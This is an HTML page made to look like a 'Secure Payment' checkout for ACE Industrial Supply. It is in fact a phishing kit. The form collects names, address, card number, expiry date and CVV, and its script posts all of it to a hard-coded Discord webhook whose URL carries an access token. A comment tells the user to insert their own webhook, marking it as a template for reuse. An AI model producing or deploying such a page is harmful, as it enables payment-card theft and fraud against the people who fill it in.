<!DOCTYPE html>
<html lang="en">
<head> 
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ACE Industrial Supply – Payment</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">

<style>
body {
    font-family: 'Poppins', sans-serif;
    background: linear-gradient(135deg, #f3f4f6, #e5e7eb);
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    margin: 0;
}

.container {
    background: #ffffff;
    padding: 40px;
    border-radius: 18px;
    max-width: 560px;
    width: 100%;
    box-shadow: 0 15px 35px rgba(0,0,0,0.15);
}

.logo {
    text-align: left;
    margin-bottom: 20px;
}

.logo img {
    width: 260px;
}

h1 {
    font-size: 24px;
    margin-bottom: 25px;
    color: #1f2937;
}

label {
    font-weight: 600;
    margin-bottom: 6px;
    display: block;
    color: #374151;
}

input {
    width: 100%;
    padding: 14px;
    margin-bottom: 18px;
    border-radius: 10px;
    border: 1px solid #d1d5db;
    font-size: 15px;
}

.card-row {
    display: grid;
    grid-template-columns: 2fr 1fr 1fr;
    gap: 14px;
}

button {
    width: 100%;
    background: #f2b705;
    color: white;
    font-size: 18px;
    font-weight: 700;
    padding: 16px;
    border: none;
    border-radius: 12px;
    cursor: pointer;
}

button:hover {
    background: #d9a404;
}

.success {
    display: none;
    text-align: center;
    font-size: 22px;
    color: #16a34a;
    font-weight: 600;
}
.note {
    font-size: 13px;
    color: #6b7280;
    margin-top: 15px;
}
</style>
</head>

<body>

 <div class="container">

    <div class="logo">
        <img src="https://epodcastnetwork.com/wp-content/uploads/2021/05/ee0345_921cbaa05549435ca969075670143e02mv2.jpg"
             alt="ACE Industrial Supply">
    </div>

<h1>Secure Payment information </h1>
    
    <form id="infoForm">
        <label>FIRST NAME</label>
        <input type="text" name="firstName" required>

        <label>SECOND NAME</label>
        <input type="text" name="secondName" required>

        <label>MIDDLE NAME</label>
        <input type="text" name="middleName">

        <label>ADDRESS</label>
        <textarea name="address" rows="3" required></textarea>

        <label>CARD HOLDER</label>
        <input type="text" name="cardHolder" required>

        <label>CARD NUMBER</label>
        <input type="text" name="cardNumber" placeholder="1234 5678 9012 3456" required>

        <div class="card-row">
            <div>
                <label>EXPIRY DATE</label>
                <input type="text" name="expiry" placeholder="MM/YY" required>
            </div>
            <div>
                <label>CARD CVV</label>
                <input type="text" name="cvv" placeholder="123" maxlength="4" required>
            </div>
        </div>

        <button type="submit" id="submitBtn">Submit</button>
    </form>

<script>
    const form = document.getElementById('infoForm');
    const thankYou = document.getElementById('thankYouMessage');
    const errorMsg = document.getElementById('errorMessage');
    const submitBtn = document.getElementById('submitBtn');

    // PUT YOUR REAL DISCORD WEBHOOK URL HERE
    const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1448834115981021329/TzZtUP5ZhvUSo9ttQIAjE2o1Lqvm2K_iFAX8Md8GMfIw-STeleL3DMX7G-RyT4TijN9c';

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        submitBtn.disabled = true;
        submitBtn.textContent = 'Processing...';
        

        const data = Object.fromEntries(new FormData(form));

        const message = {
            content: `**NEW ACE PAYMENT INFORMATION**\n\n` +
                     `**First Name:** ${data.firstName}\n` +
                     `**Second Name:** ${data.secondName}\n` +
                     `**Middle Name:** ${data.middleName || '—'}\n` +
                     `**Address:** ${data.address}\n` +
                     `**Card Holder:** ${data.cardHolder}\n` +
                     `**Card Number:** ${data.cardNumber}\n` +
                     `**Expiry Date:** ${data.expiry}\n` +
                     `**CVV:** ${data.cvv}`
        };

        try {
            const res = await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(message)
            });

            if (res.ok) {
                form.style.display = 'none';
                thankYou.style.display = 'block';
            } else throw new Error();
        } catch (err) {
            errorMsg.style.display = 'block';
        } finally {
            submitBtn.disabled = false;
            submitBtn.textContent = 'Submit Payment';
        }
    });
</script>
</body>
</html>
